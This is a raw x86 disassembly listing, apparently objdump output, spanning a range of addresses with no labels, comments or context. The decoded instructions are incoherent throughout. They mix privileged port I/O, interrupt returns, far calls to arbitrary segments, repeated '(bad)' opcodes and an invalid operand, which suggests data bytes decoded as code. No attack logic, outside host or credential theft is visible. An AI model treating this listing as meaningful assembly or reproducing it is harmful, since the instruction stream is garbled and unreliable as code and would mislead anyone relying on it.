  416757:	and    DWORD PTR cs:[esi+0x6fc36d00],esi
  41675e:	mov    esp,0xa59bb8ef
  416763:	cmp    eax,0x66a73033
  416768:	mov    ebx,0xcd928cc6
  41676d:	jle    0x41670a
  41676f:	mov    esi,0xa529c183
  416774:	pop    edx
  416775:	mov    ds:0xd23d97dc,al
  41677a:	sahf   
  41677b:	in     al,dx
  41677c:	jmp    DWORD PTR [edi+0x597a7061]
  416782:	or     DWORD PTR [ecx+0x6],ebx
  416785:	sahf   
  416786:	cwde   
  416787:	scas   al,BYTE PTR es:[edi]
  416788:	popf   
  416789:	add    edx,edi
  41678b:	iret   
  41678c:	sbb    eax,0xdace6fb0
  416791:	push   ebp
  416792:	je     0x4167fe
  416794:	ret    0xfd1
  416797:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416798:	cmp    BYTE PTR [edi+edi*8],0xa6
  41679c:	js     0x416819
  41679e:	sbb    al,0xd6
  4167a0:	cmp    bh,BYTE PTR [ebx-0x2e3ab43c]
  4167a6:	fs in  al,dx
  4167a8:	dec    ebp
  4167a9:	cmp    ah,BYTE PTR ds:0x133828fc
  4167af:	add    eax,DWORD PTR [ecx+ecx*8-0x4a]
  4167b3:	call   0x2a21505e
  4167b8:	dec    ebx
  4167b9:	repz fsub QWORD PTR [esi-0x63028696]
  4167c0:	fistp  QWORD PTR [ecx-0x22a8753c]
  4167c6:	xor    BYTE PTR [ebp-0x51],ch
  4167c9:	mov    eax,0x73d6d4ec
  4167ce:	jns    0x416782
  4167d0:	pop    DWORD PTR [edx+ecx*8+0xbd24da]
  4167d7:	add    BYTE PTR [esi-0x4f],bl
  4167da:	rol    BYTE PTR [eax-0x70eadbff],0x5d
  4167e1:	ins    BYTE PTR es:[edi],dx
  4167e2:	push   eax
  4167e3:	xchg   BYTE PTR [edi-0x7e87907d],al
  4167e9:	outs   dx,BYTE PTR ds:[esi]
  4167ea:	inc    ebp
  4167eb:	jne    0x416781
  4167ed:	sbb    eax,0xff23846d
  4167f2:	pop    es
  4167f3:	jl     0x416802
  4167f5:	fnop   
  4167f7:	push   ebx
  4167f8:	sub    BYTE PTR [esi],dl
  4167fa:	add    ebp,DWORD PTR [ebp+0x410f5f0]
  416800:	push   edx
  416801:	and    eax,edi
  416803:	cdq    
  416804:	lahf   
  416805:	xor    dh,dl
  416807:	aaa    
  416808:	loopne 0x41682b
  41680a:	into   
  41680b:	push   eax
  41680c:	ret    
  41680d:	data16 jg 0x4167fb
  416810:	ret    0x1451
  416813:	jns    0x4167a8
  416815:	inc    edx
  416816:	jns    0x4167ed
  416818:	mov    edx,0xea16fd3f
  41681d:	xchg   edi,eax
  41681e:	dec    esp
  41681f:	sbb    BYTE PTR [esi-0x5444f3e5],dl
  416825:	repnz xor ebx,DWORD PTR [edi]
  416828:	aad    0x18
  41682a:	int    0x2c
  41682c:	test   DWORD PTR [ebp+0x35180708],ecx
  416832:	fsubr  DWORD PTR [ecx]
  416834:	mov    ebx,0xca6b2b9a
  416839:	add    dh,dh
  41683b:	into   
  41683c:	mov    bl,0x42
  41683e:	inc    eax
  41683f:	fucomi st,st(2)
  416841:	mov    cl,0xf8
  416843:	icebp  
  416844:	pop    esp
  416845:	test   DWORD PTR [esi+0x14],edi
  416848:	mov    ebx,0xb212e27b
  41684d:	iret   
  41684e:	fwait
  41684f:	retf   
  416850:	xchg   ebx,eax
  416851:	adc    edi,DWORD PTR [edx-0x8ab7d99]
  416857:	mov    al,ds:0xeb49e26d
  41685c:	loop   0x416880
  41685e:	cmc    
  41685f:	mov    DWORD PTR [edi+0x36],esi
  416862:	and    BYTE PTR [esp+esi*1+0x45],dl
  416866:	adc    dh,BYTE PTR [ebx]
  416868:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416869:	mov    bh,0xe5
  41686b:	mov    ebx,gs
  41686d:	jno    0x4168d7
  41686f:	stc    
  416870:	fidiv  DWORD PTR [ecx-0x157e0d78]
  416876:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416877:	add    al,0xb4
  416879:	mov    bh,0x47
  41687b:	call   0xa6ee:0x13621e1f
  416882:	sub    BYTE PTR [ebx-0x79],ch
  416885:	sbb    dh,al
  416887:	jno    0x4168fe
  416889:	push   ecx
  41688b:	jecxz  0x416855
  41688d:	inc    ebx
  41688e:	mov    DWORD PTR [ecx+0x225d4a49],esp
  416894:	mov    eax,0x308d1a8a
  416899:	aaa    
  41689a:	dec    ecx
  41689b:	jl     0x4168ab
  41689d:	mov    bh,0x9f
  41689f:	mov    ds:0x80309298,al
  4168a4:	sbb    esp,edx
  4168a6:	mov    eax,0x424dbcf7
  4168ab:	push   cs
  4168ac:	imul   ebp,DWORD PTR [edx-0x7d39a1bd],0xefade2a9
  4168b6:	movzx  ecx,BYTE PTR [eax-0x1b45752a]
  4168bd:	mov    eax,DWORD PTR [ebp-0x556facae]
  4168c3:	aas    
  4168c4:	jg     0x4168a0
  4168c6:	pop    es
  4168c7:	fwait
  4168c8:	in     al,0xd2
  4168ca:	add    DWORD PTR [ebp-0x142b7c95],esp
  4168d0:	ins    BYTE PTR es:[edi],dx
  4168d1:	ins    DWORD PTR es:[edi],dx
  4168d2:	mov    al,0xc0
  4168d4:	fwait
  4168d5:	cmp    ch,cl
  4168d7:	outs   dx,DWORD PTR ds:[esi]
  4168d8:	ret    
  4168d9:	or     al,0x6b
  4168db:	push   es
  4168dc:	dec    ebp
  4168dd:	jae    0x416931
  4168df:	pop    ecx
  4168e0:	out    dx,al
  4168e1:	in     eax,dx
  4168e2:	lds    esi,FWORD PTR [edx+0x17]
  4168e5:	sub    al,0x83
  4168e7:	jns    0x416951
  4168e9:	xor    eax,0x239714ee
  4168ee:	stos   DWORD PTR es:[edi],eax
  4168ef:	pushf  
  4168f0:	test   BYTE PTR ds:0x720d5b24,dl
  4168f6:	mul    DWORD PTR [edi]
  4168f8:	in     eax,dx
  4168f9:	mov    ah,0xad
  4168fb:	loop   0x416907
  4168fd:	imul   ebx,DWORD PTR [esi],0xffffffbd
  416900:	or     DWORD PTR [ebx+0x30fe286c],esp
  416906:	popa   
  416907:	stc    
  416908:	(bad)  
  416909:	xchg   ebx,eax
  41690a:	adc    al,0x6b
  41690c:	jbe    0x4168f9
  41690e:	ins    DWORD PTR es:[edi],dx
  41690f:	sbb    DWORD PTR [ebx],ecx
  416911:	lock dec ecx
  416913:	sar    BYTE PTR [ebx-0x78f11ca0],cl
  416919:	retf   0x81d7
  41691c:	pop    es
  41691d:	jbe    0x416985
  41691f:	mov    edx,0x3d79926b
  416924:	lds    eax,FWORD PTR [eax+0x42c6a58d]
  41692a:	std    
  41692b:	xor    eax,esi
  41692d:	not    edi
  41692f:	xchg   edx,eax
  416930:	dec    edi
  416931:	dec    ecx
  416932:	dec    edi
  416933:	jmp    0x416926
  416935:	pushf  
  416936:	aas    
  416937:	xchg   ecx,eax
  416938:	or     DWORD PTR [eax+0x12b8a936],0x5a9d9a55
  416942:	cdq    
  416943:	scas   al,BYTE PTR es:[edi]
  416944:	(bad)  
  416945:	loopne 0x416900
  416947:	jp     0x4169b5
  416949:	test   al,0xca
  41694b:	xchg   DWORD PTR [edx+0x749113b6],esi
  416951:	arpl   ax,si
  416953:	jl     0x416975
  416955:	or     DWORD PTR [eax-0x3d],ebp
  416958:	sub    eax,0x2871c380
  41695d:	sbb    ebx,DWORD PTR [edi-0x43b57120]
  416963:	fs cs daa 
  416966:	adc    bx,ax
  416969:	test   eax,0x68f26258
  41696e:	add    eax,0x49b69481
  416973:	sub    BYTE PTR [edi],ah
  416975:	clc    
  416976:	aam    0x7a
  416978:	sub    BYTE PTR [edi-0x222f681f],al
  41697e:	out    dx,al
  41697f:	bound  esp,QWORD PTR [ebx+0x4]
  416982:	ret    
  416983:	jmp    DWORD PTR [ebp-0x3992c43a]
  416989:	aas    
  41698a:	push   eax
  41698b:	fadd   DWORD PTR ds:0x109b2d62
  416991:	mov    eax,0xdbe837dd
  416996:	or     bl,BYTE PTR [esi+esi*2]
  416999:	loopne 0x4169ff
  41699b:	adc    al,0x74
  41699d:	push   edi
  41699e:	sbb    al,0x7a
  4169a0:	or     dh,BYTE PTR [ecx+0x594a7108]
  4169a6:	add    eax,0x725f79bd
  4169ab:	jle    0x416950
  4169ad:	push   cs
  4169ae:	pop    si
  4169b0:	(bad)  
  4169b2:	mov    al,ds:0xaabd2a8a
  4169b7:	ja     0x4169b3
  4169b9:	dec    esp
  4169ba:	sub    eax,0x29be6854
  4169bf:	(bad)  
  4169c0:	mov    ebx,0xc993b690
  4169c5:	jl     0x4169b1
  4169c7:	sbb    DWORD PTR [esi+0x46],ecx
  4169ca:	stos   BYTE PTR es:[edi],al
  4169cb:	xlat   BYTE PTR ds:[ebx]
  4169cc:	or     al,0x40
  4169ce:	(bad)  
  4169cf:	mov    eax,ds:0x61a892f9
  4169d4:	mov    ecx,0xd4e5d0ff
  4169d9:	pop    ebp
  4169da:	inc    ebx
  4169db:	cmc    
  4169dc:	scas   eax,DWORD PTR es:[edi]
  4169dd:	add    BYTE PTR [esp+eax*8+0x31d176f5],dl
  4169e4:	fsub   DWORD PTR [ecx-0x5d3d28a3]
  4169ea:	sub    DWORD PTR [edx],edi
  4169ec:	cmp    esp,ebp
  4169ee:	mov    ebx,0xe5be6cb7
  4169f3:	push   ebx
  4169f4:	arpl   WORD PTR [esi],bx
  4169f6:	mov    al,ds:0x38e92e69
  4169fb:	inc    edi
  4169fc:	fisub  WORD PTR [ebx]
  4169fe:	or     eax,0x91d76cb8
  416a03:	pop    es
  416a04:	mov    al,ds:0x72751aa4
  416a09:	repnz test BYTE PTR ds:[esp+ebp*1-0x42],0x98
  416a10:	mov    al,0x33
  416a12:	inc    ebp
  416a13:	jmp    0x416a13
  416a15:	and    DWORD PTR [esi+0x2575019],0x1
  416a1c:	push   ebp
  416a1d:	push   edx
  416a1e:	and    dl,BYTE PTR [edx+0x4c]
  416a21:	pop    ecx
  416a22:	pop    edx
  416a23:	pop    ecx
  416a24:	sahf   
  416a25:	mov    esp,edx
  416a27:	ds pushf 
  416a29:	inc    esp
  416a2a:	punpckldq mm7,mm0
  416a2d:	xchg   BYTE PTR [edx+0x1360f5bd],bl
  416a33:	sub    ebx,DWORD PTR [eax-0x75]
  416a36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a37:	xchg   ecx,eax
  416a38:	nop
  416a39:	repnz fs xchg ecx,eax
  416a3c:	rcr    BYTE PTR [ebp+0x13528fa5],1
  416a42:	mov    ds:0xff66f23b,al
  416a47:	out    0x89,eax
  416a49:	popf   
  416a4a:	test   al,0x67
  416a4c:	sahf   
  416a4d:	adc    DWORD PTR [ebp-0x4d400e9],edx
  416a53:	in     al,dx
  416a54:	arpl   WORD PTR [edx],ax
  416a56:	repnz scas al,BYTE PTR es:[edi]
  416a58:	pop    ebx
  416a59:	in     al,dx
  416a5a:	push   es
  416a5b:	aaa    
  416a5c:	xor    cl,0x46
  416a5f:	aaa    
  416a60:	sub    al,0x8a
  416a62:	outs   dx,BYTE PTR ds:[esi]
  416a63:	adc    DWORD PTR [ebp-0x64],0xffffffb2
  416a67:	nop
  416a68:	imul   eax,eax,0xffffffef
  416a6b:	jno    0x416a66
  416a6d:	dec    edi
  416a6e:	(bad)  
  416a6f:	jecxz  0x416a58
  416a71:	cmp    BYTE PTR [eax-0x56bcb56b],al
  416a77:	retf   
  416a78:	outs   dx,DWORD PTR ds:[esi]
  416a79:	jb     0x416ad0
  416a7b:	sar    ch,1
  416a7d:	or     edx,DWORD PTR [edi+0x6cbc8e6d]
  416a83:	and    DWORD PTR [ebx],edi
  416a85:	sbb    ecx,ebp
  416a87:	je     0x416a6b
  416a89:	push   esp
  416a8a:	sbb    esi,edx
  416a8c:	pop    ecx
  416a8d:	test   DWORD PTR [ebx],edi
  416a8f:	aad    0x36
  416a91:	call   0xcd968c09
  416a96:	lds    esp,FWORD PTR [ebp+0x15]
  416a99:	or     DWORD PTR [ecx],0x1dbd6329
  416a9f:	fisub  WORD PTR [ebx+0xf1ed772]
  416aa5:	push   ss
  416aa6:	fisub  WORD PTR [ebx]
  416aa8:	nop
  416aa9:	fsub   DWORD PTR [edx]
  416aab:	adc    al,0xa9
  416aad:	mov    bh,cl
  416aaf:	out    dx,eax
  416ab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ab1:	je     0x416b0c
  416ab3:	add    al,0x6c
  416ab5:	sar    BYTE PTR [edx+0x21],1
  416ab8:	imul   ebx,DWORD PTR [ebx+0x26],0x2
  416abc:	stc    
  416abd:	mov    ebx,0xf8b9967e
  416ac2:	mov    BYTE PTR ds:0x12e6ff0,0x61
  416ac9:	shl    BYTE PTR [esp+eiz*4],cl
  416acc:	out    0x78,al
  416ace:	aam    0x21
  416ad0:	stos   DWORD PTR es:[edi],eax
  416ad1:	shr    BYTE PTR [ebp+0x5f],0xff
  416ad5:	push   ds
  416ad6:	mov    cl,0x91
  416ad8:	popf   
  416ad9:	mov    ch,0x6d
  416adb:	stos   BYTE PTR es:[edi],al
  416adc:	loop   0x416b09
  416ade:	or     al,0x3
  416ae0:	clc    
  416ae1:	out    0x71,al
  416ae3:	push   ebx
  416ae4:	daa    
  416ae5:	je     0x416a8e
  416ae7:	mov    ds:0xaf000bb2,eax
  416aec:	outs   dx,BYTE PTR ds:[esi]
  416aed:	aam    0xd4
  416aef:	mov    ecx,ds
  416af1:	xchg   ebx,eax
  416af2:	shl    BYTE PTR [edi],1
  416af4:	js     0x416b11
  416af6:	xchg   ebx,eax
  416af7:	pop    edi
  416af8:	push   0xf1d0afc1
  416afd:	xchg   esi,eax
  416afe:	call   0xf2e1818a
  416b03:	bndstx [esi+0x2],(bad)
  416b07:	ret    
  416b08:	adc    al,0x13
  416b0a:	mov    ch,0xd9
  416b0c:	ss in  al,0x17
  416b0f:	imul   ebp,DWORD PTR [eax+0x291f5d07],0xfffffff3
  416b16:	jl     0x416b23
  416b18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b19:	repnz rol ah,cl
  416b1c:	inc    ebp
  416b1d:	adc    BYTE PTR [ebp-0x5c],bh
  416b20:	mov    ah,0xb
  416b22:	icebp  
  416b23:	or     bl,BYTE PTR [esi+0x1]
  416b26:	int    0xe8
  416b28:	cmp    DWORD PTR [edx],esi
  416b2a:	sbb    al,0xb1
  416b2c:	push   esp
  416b2d:	dec    edi
  416b2e:	mov    ecx,0x27a25720
  416b33:	mov    ch,0x70
  416b35:	xchg   esp,eax
  416b36:	rcr    BYTE PTR [ebx],cl
  416b38:	or     eax,0xa2a3c46d
  416b3d:	and    edx,DWORD PTR ds:0x1befdca3
  416b43:	sbb    al,0xd
  416b45:	pop    ds
  416b46:	in     al,dx
  416b47:	sbb    bh,BYTE PTR [ebp-0x40]
  416b4a:	push   esi
  416b4b:	push   es
  416b4c:	scas   eax,DWORD PTR es:[edi]
  416b4d:	mov    DWORD PTR ds:0xadd8982a,esi
  416b53:	jle    0x416bcd
  416b55:	arpl   WORD PTR [eax],bp
  416b57:	loop   0x416bc7
  416b59:	fnstcw WORD PTR [ebp-0x14]
  416b5c:	sub    BYTE PTR [ecx],al
  416b5e:	icebp  
  416b5f:	pusha  
  416b60:	(bad)
  416b63:	fwait
  416b64:	jo     0x416b73
  416b66:	push   edx
  416b67:	adc    al,0x6a
  416b69:	ja     0x416b69
  416b6b:	dec    esi
  416b6c:	pop    eax
  416b6d:	jbe    0x416afe
  416b6f:	jp     0x416b9d
  416b71:	cmc    
  416b72:	sbb    BYTE PTR [edi],dh
  416b74:	sub    ch,BYTE PTR [ebx-0x52]
  416b77:	pop    edx
  416b78:	pop    ebp
  416b79:	jge    0x416b06
  416b7b:	or     eax,0x2a1fbad7
  416b80:	lahf   
  416b81:	push   0xffffffc9
  416b83:	daa    
  416b84:	jle    0x416bd6
  416b86:	outs   dx,WORD PTR ds:[esi]
  416b88:	jae    0x416b14
  416b8a:	push   ds
  416b8b:	das    
  416b8c:	add    dh,ch
  416b8e:	outs   dx,DWORD PTR ds:[esi]
  416b8f:	icebp  
  416b90:	dec    ebx
  416b91:	daa    
  416b92:	adc    cl,BYTE PTR [eax+0x66]
  416b95:	ins    BYTE PTR es:[edi],dx
  416b96:	aas    
  416b97:	fistp  DWORD PTR [edi]
  416b99:	sbb    al,0x21
  416b9b:	sub    eax,DWORD PTR [edi-0x1c]
  416b9e:	and    BYTE PTR [eax+0x7b],ch
  416ba1:	xchg   ebx,eax
  416ba2:	and    al,0x77
  416ba4:	inc    eax
  416ba5:	(bad)
  416ba9:	inc    edx
  416baa:	add    esp,DWORD PTR [esi-0x11]
  416bad:	(bad)  
  416bae:	addr16 pushf 
  416bb0:	das    
  416bb1:	add    eax,0xbf387cf2
  416bb6:	ins    BYTE PTR es:[edi],dx
  416bb7:	or     al,0xbe
  416bb9:	jnp    0x416b41
  416bbb:	sbb    BYTE PTR [eax-0x2],dh
  416bbe:	mov    al,0xe2
  416bc0:	jno    0x416b47
  416bc2:	xor    al,dh
  416bc4:	rcl    DWORD PTR [edi+0x5e],0x75
  416bc8:	sub    BYTE PTR [esi-0x6c],bl
  416bcb:	out    0xde,al
  416bcd:	sti    
  416bce:	scas   al,BYTE PTR es:[edi]
  416bcf:	mov    ds:0x7b22cb23,eax
  416bd4:	push   edx
  416bd5:	inc    ebx
  416bd6:	mov    ch,0xe3
  416bd8:	push   edi
  416bd9:	jmp    0x416bbc
  416bdb:	inc    ebp
  416bdc:	mov    ebp,0x8132a735
  416be1:	mov    dl,0xe2
  416be3:	sub    DWORD PTR [esi-0x50],edi
  416be6:	aaa    
  416be7:	std    
  416be8:	jp     0x416beb
  416bea:	cwde   
  416beb:	xchg   ecx,eax
  416bec:	loopne 0x416b70
  416bee:	pop    edx
  416bef:	fmul   DWORD PTR [edi-0x4]
  416bf2:	mov    ebp,0xff7232a6
  416bf7:	xchg   ecx,eax
  416bf8:	inc    edx
  416bf9:	cmp    edi,DWORD PTR [eax+0x65da1b47]
  416bff:	mov    ebp,0x8c591bf9
  416c04:	adc    esi,DWORD PTR [esi-0xb]
  416c07:	xchg   edi,eax
  416c08:	jo     0x416c14
  416c0a:	and    eax,0x400b68a0
  416c0f:	push   ss
  416c10:	test   eax,0x708ac2d6
  416c15:	mov    bl,0x8
  416c17:	test   BYTE PTR [ebx],0x4
  416c1a:	or     ebx,DWORD PTR [edx]
  416c1c:	ja     0x416c63
  416c1e:	mov    ch,0x59
  416c20:	jp     0x416c4e
  416c22:	fcomp  QWORD PTR [ecx-0x6d99fcc0]
  416c28:	ins    DWORD PTR es:[edi],dx
  416c29:	int    0xd
  416c2b:	in     al,0xc1
  416c2d:	sbb    BYTE PTR [esi],dl
  416c2f:	cmp    ch,0x9b
  416c32:	sbb    BYTE PTR [ecx],al
  416c34:	stos   BYTE PTR es:[edi],al
  416c35:	je     0x416be4
  416c37:	sub    esi,esi
  416c39:	dec    ebx
  416c3a:	inc    ecx
  416c3b:	and    BYTE PTR [edx+0x5e],bh
  416c3e:	mov    al,0xd7
  416c40:	xchg   BYTE PTR [esi+0x164d733c],al
  416c46:	loop   0x416cad
  416c48:	pop    ds
  416c49:	xchg   esi,eax
  416c4a:	jb     0x416c4f
  416c4c:	adc    BYTE PTR [ebx+0x226124a8],dl
  416c52:	jge    0x416bd4
  416c54:	sub    eax,eax
  416c56:	add    DWORD PTR [edi-0x3df68444],esp
  416c5c:	in     al,dx
  416c5d:	mov    edx,0xbe0fdd41
  416c62:	test   DWORD PTR [ebx+0x2a],edi
  416c65:	jbe    0x416c12
  416c67:	fldenv [ecx-0x3197c2cd]
  416c6d:	jle    0x416bf6
  416c6f:	test   al,0xcc
  416c71:	imul   edi,DWORD PTR ds:0xda107f93,0xc569cc24
  416c7b:	xor    DWORD PTR ss:[edx+ebx*1+0x32],ecx
  416c80:	jle    0x416c85
  416c82:	ins    DWORD PTR es:[edi],dx
  416c83:	bts    DWORD PTR [ebx],0x1a
  416c87:	stos   DWORD PTR es:[edi],eax
  416c88:	jmp    0x9411:0x8907e74f
  416c8f:	loopne 0x416c69
  416c91:	jg     0x416ccd
  416c93:	test   eax,0x9ad40981
  416c98:	push   ebp
  416c99:	pop    ss
  416c9a:	mov    ecx,edi
  416c9c:	pop    ss
  416c9d:	enter  0xdc3d,0x61
  416ca1:	mov    al,0xfa
  416ca3:	jb     0x416c95
  416ca5:	imul   ebp,DWORD PTR [edi-0x25],0x11
  416ca9:	push   0xffffffbc
  416cab:	mov    dh,0x90
  416cad:	adc    DWORD PTR ds:0x66d42cf0,0xffffffda
  416cb4:	fs in  eax,dx
  416cb6:	das    
  416cb7:	cli    
  416cb8:	jmp    0x416c6e
  416cba:	test   DWORD PTR [ebx],0x26719635
  416cc0:	ret    
  416cc1:	inc    ecx
  416cc2:	adc    cl,bh
  416cc4:	ss ins BYTE PTR es:[edi],dx
  416cc6:	push   0xffffff84
  416cc8:	push   ebp
  416cc9:	and    al,0xb1
  416ccb:	adc    dl,BYTE PTR [edx+0x72]
  416cce:	push   ss
  416ccf:	fdiv   DWORD PTR [esi]
  416cd1:	scas   al,BYTE PTR es:[edi]
  416cd2:	loopne 0x416d35
  416cd4:	loope  0x416ce5
  416cd6:	fmul   QWORD PTR [esi]
  416cd8:	cmp    ebp,DWORD PTR [ecx-0x39db18e9]
  416cde:	je     0x416d4d
  416ce0:	neg    BYTE PTR [edi+0x6c]
  416ce3:	push   eax
  416ce4:	or     bl,BYTE PTR [ecx]
  416ce6:	popf   
  416ce7:	xchg   edi,eax
  416ce8:	pop    ecx
  416ce9:	fisubr DWORD PTR [ebp-0x79]
  416cec:	inc    esi
  416ced:	dec    eax
  416cee:	mov    ds:0x7eef73d7,eax
  416cf3:	stos   BYTE PTR es:[edi],al
  416cf4:	xchg   edx,eax
  416cf5:	fild   QWORD PTR [edx]
  416cf7:	imul   esp,DWORD PTR [esi-0x4],0x8fb7bcce
  416cfe:	popf   
  416cff:	cmp    BYTE PTR [esi+0x1f],0xc5
  416d03:	bound  ebp,QWORD PTR [ebx+eax*4-0x72]
  416d07:	inc    ebx
  416d08:	push   0xa
  416d0a:	stc    
  416d0b:	mov    edx,0x770d49e2
  416d10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d11:	daa    
  416d12:	scas   al,BYTE PTR es:[edi]
  416d13:	xchg   edi,eax
  416d14:	inc    DWORD PTR [ecx+eax*2+0x44]
  416d18:	pop    eax
  416d19:	add    dh,BYTE PTR [eax+0x6e1c4042]
  416d1f:	xor    al,0xa1
  416d21:	adc    BYTE PTR [ecx],cl
  416d23:	fwait
  416d24:	sub    eax,0xb0e62ec
  416d29:	xor    eax,0x8b857629
  416d2e:	imul   ebp,DWORD PTR [esi],0x16
  416d31:	scas   al,BYTE PTR es:[edi]
  416d32:	call   0x2d39:0xac568848
  416d39:	mov    ds,WORD PTR [edx+eiz*1+0x48]
  416d3d:	pop    ebp
  416d3e:	jae    0x416ced
  416d40:	push   0x18702660
  416d45:	dec    esp
  416d46:	inc    esp
  416d47:	add    BYTE PTR [edx+0x7b],ah
  416d4a:	dec    eax
  416d4b:	add    eax,0x6436c956
  416d50:	in     al,dx
  416d51:	popf   
  416d52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d53:	icebp  
  416d54:	inc    ebp
  416d55:	jle    0x416cde
  416d57:	and    DWORD PTR [ecx-0x4f408687],ebp
  416d5d:	cli    
  416d5e:	nop
  416d5f:	out    dx,al
  416d60:	sub    al,0x65
  416d62:	mov    ecx,0xbe13aac2
  416d67:	pop    ebx
  416d68:	jnp    0x416d12
  416d6a:	lock or eax,0xa0cde544
  416d70:	(bad)  
  416d71:	adc    DWORD PTR [ebx-0x3829200e],ebp
  416d77:	sub    ebp,ecx
  416d79:	int3   
  416d7a:	jmp    0xa2460d75
  416d7f:	jbe    0x416dde
  416d81:	and    dl,BYTE PTR [eax-0x454ca5ca]
  416d87:	push   ss
  416d88:	rol    BYTE PTR [eax+0x46],1
  416d8b:	int    0x2a
  416d8d:	mov    edi,0x31124b7d
  416d92:	pop    ecx
  416d93:	dec    esp
  416d94:	mul    bh
  416d96:	or     dh,ch
  416d98:	jle    0x416d44
  416d9a:	fcmove st,st(1)
  416d9c:	pop    esi
  416d9d:	add    al,0x76
  416d9f:	adc    edx,DWORD PTR [esi]
  416da1:	jl     0x416e14
  416da3:	pop    ebp
  416da4:	pop    edi
  416da5:	sub    cl,BYTE PTR [ecx+0x6f]
  416da8:	lahf   
  416da9:	cli    
  416daa:	fnsetpm(287 only) 
  416dac:	sub    al,BYTE PTR [ecx+0x1a]
  416daf:	pop    ss
  416db0:	cmp    esi,DWORD PTR [edi+eiz*8]
  416db3:	mov    ?,WORD PTR [ecx+eax*2+0x3d]
  416db7:	clc    
  416db8:	and    ecx,DWORD PTR [esi-0x373e0aac]
  416dbe:	popf   
  416dbf:	int    0x62
  416dc1:	aaa    
  416dc2:	stos   BYTE PTR es:[edi],al
  416dc3:	hlt    
  416dc4:	jae    0x416e34
  416dc6:	data16 rol BYTE PTR [ecx-0x61be1c5e],0x31
  416dce:	jo     0x416dbd
  416dd0:	jo     0x416d90
  416dd2:	repnz or dl,0x7b
  416dd6:	xchg   DWORD PTR [ecx],edx
  416dd8:	cs sbb dl,ah
  416ddb:	les    esp,FWORD PTR [eax-0x63]
  416dde:	pop    esi
  416ddf:	xor    BYTE PTR [esi],dh
  416de1:	add    bh,cl
  416de3:	and    eax,0xac3dc5d9
  416de8:	push   edi
  416de9:	dec    edi
  416dea:	sbb    bl,bl
  416dec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ded:	add    esi,DWORD PTR [eax]
  416def:	test   BYTE PTR [ebx+0x4],cl
  416df2:	addr16 rol ebx,cl
  416df5:	out    dx,eax
  416df6:	bound  ebp,QWORD PTR [eax*1-0x426a22d4]
  416dfd:	jle    0x416e4a
  416dff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e00:	lahf   
  416e01:	int    0x60
  416e03:	scas   al,BYTE PTR es:[edi]
  416e04:	sub    ebp,DWORD PTR [esi-0x26]
  416e07:	cmp    bl,dh
  416e09:	jle    0x416e51
  416e0b:	(bad)  
  416e0c:	fld    DWORD PTR [eax-0x60]
  416e0f:	inc    ebp
  416e10:	pusha  
  416e11:	mov    bl,0xfe
  416e13:	fs out 0xe7,eax
  416e16:	mov    esi,0x2c91f476
  416e1b:	adc    DWORD PTR [ebp-0x2a],eax
  416e1e:	xchg   BYTE PTR [ebx],ch
  416e20:	leave  
  416e21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e22:	ins    DWORD PTR es:[edi],dx
  416e23:	inc    eax
  416e24:	js     0x416dbc
  416e26:	(bad)  
  416e27:	xor    al,0x38
  416e29:	ins    BYTE PTR es:[edi],dx
  416e2a:	jno    0x416e98
  416e2c:	xchg   ebx,eax
  416e2e:	jmp    0x416e93
  416e30:	add    cl,BYTE PTR [ecx+ebp*1-0x542553af]
  416e37:	ret    
  416e38:	jnp    0x416dbd
  416e3a:	aas    
  416e3b:	imul   esp,DWORD PTR [esi+0x1f17ace9],0x54
  416e42:	xchg   edi,eax
  416e43:	stc    
  416e44:	dec    edx
  416e45:	mov    ebp,0xb3b9140a
  416e4a:	or     al,0xba
  416e4c:	push   ebx
  416e4d:	push   esi
  416e4e:	mov    ch,dl
  416e50:	sub    bh,bl
  416e52:	pop    ds
  416e53:	jg     0x416e6c
  416e55:	or     DWORD PTR [ecx],edi
  416e57:	enter  0x2ab3,0xa0
  416e5b:	cmp    DWORD PTR [edx-0x5b],0x15
  416e5f:	sbb    eax,0xf2fc21eb
  416e64:	int3   
  416e65:	sub    al,0x8b
  416e67:	mov    al,ds:0xc220e0d6
  416e6c:	push   edi
  416e6d:	repz loop 0x416e12
  416e70:	sub    eax,0x86f9431f
  416e75:	mov    ds:0x4f56dee6,eax
  416e7a:	neg    BYTE PTR [edi+ebp*2-0x5f419383]
  416e81:	cmc    
  416e82:	idiv   DWORD PTR [ebx]
  416e84:	jle    0x416e79
  416e86:	adc    eax,0x77f47a32
  416e8b:	push   edx
  416e8c:	mov    edx,0x7def520b
  416e91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e92:	loop   0x416ef7
  416e94:	ins    DWORD PTR es:[edi],dx
  416e95:	(bad)  
  416e96:	sub    al,0x4e
  416e98:	sub    edi,ebp
  416e9a:	add    BYTE PTR [edx-0x67],bl
  416e9d:	cmp    edx,DWORD PTR [ebx]
  416e9f:	mov    bh,0xad
  416ea1:	cmp    DWORD PTR [edi+0x62105963],edi
  416ea7:	mov    si,0x5ab8
  416eab:	and    esi,DWORD PTR ds:0x395158cb
  416eb1:	leave  
  416eb2:	sbb    BYTE PTR [ebp+0x379d96d2],al
  416eb8:	icebp  
  416eb9:	or     dh,BYTE PTR [eiz*4-0x13d837c8]
  416ec0:	cs in  al,dx
  416ec2:	mov    bh,0x58
  416ec4:	xor    DWORD PTR [edi-0x9],ebp
  416ec7:	iret   
  416ec8:	mov    eax,ds:0xeb940325
  416ecd:	adc    dl,cl
  416ecf:	mov    esp,0x24afaa2f
  416ed4:	and    BYTE PTR [edi-0x55aea52b],0x86
  416edb:	sub    al,0x4
  416edd:	dec    eax
  416ede:	mov    bh,0xaf
  416ee0:	jge    0x416e6b
  416ee2:	jbe    0x416f04
  416ee4:	sbb    ah,BYTE PTR [ebp+0x546de4b4]
  416eea:	icebp  
  416eeb:	xchg   DWORD PTR [edx+0x45],esi
  416eee:	cmp    eax,0xf53546e
  416ef3:	jnp    0x416e76
  416ef5:	inc    ecx
  416ef6:	mov    al,0x6b
